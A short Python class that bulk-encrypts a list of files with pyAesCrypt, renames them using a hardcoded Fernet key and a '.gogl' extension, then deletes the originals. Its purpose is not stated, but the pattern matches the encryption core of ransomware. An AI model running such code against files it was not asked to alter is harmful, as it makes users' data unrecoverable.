import os
import time
from cryptography.fernet import Fernet
from tqdm import tqdm
import pyAesCrypt as hash

class Encrypter:
    def __init__(self, files, password) -> None:
        self.files = files
        self.hash_password = password
        self.fernet = Fernet(b'zta1UUofnowc3cur17oddzYerqMb2XDJEsKVE6wnjSI=')

    
    def generate_file_name(self, file_name):
        output = self.fernet.encrypt(file_name.encode())
        return output

    def encrypt(self):
        now = time.time()
        # todo add multi-threading

        for i in tqdm(range(len(self.files))):
            file_name = self.files[i][1]
            root_path = self.files[i][0]
            file = os.path.join(root_path, file_name)

            new_filename = self.generate_file_name(file_name)
            print("Encrypting {0} to {0}.gogl".format(file))
            hash.encryptFile(file, '{}.gogl'.format(os.path.join(root_path, str(new_filename))), self.hash_password)
            os.unlink(file)

        return{
            "time_taken": "{}".format(time.time() - now),
            "total_files": "{}".format(len(self.files))
        }
